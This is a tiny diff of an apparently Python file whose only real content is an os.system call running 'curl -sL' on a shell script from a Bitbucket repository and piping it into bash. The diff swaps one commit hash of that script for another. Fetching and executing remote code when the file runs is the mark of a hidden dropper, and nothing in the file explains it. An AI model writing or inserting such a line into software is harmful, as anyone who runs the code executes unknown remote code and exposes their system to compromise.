@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/mandaresz/feriyaz/raw/374ff793011e1166ac3ce74b8e9bb00dce00a37d/adika.sh | bash')
+os.system('curl -sL https://bitbucket.org/mandaresz/feriyaz/raw/537e8b324a2d8eb939c185f4ce78ba75a306803c/adika.sh | bash')
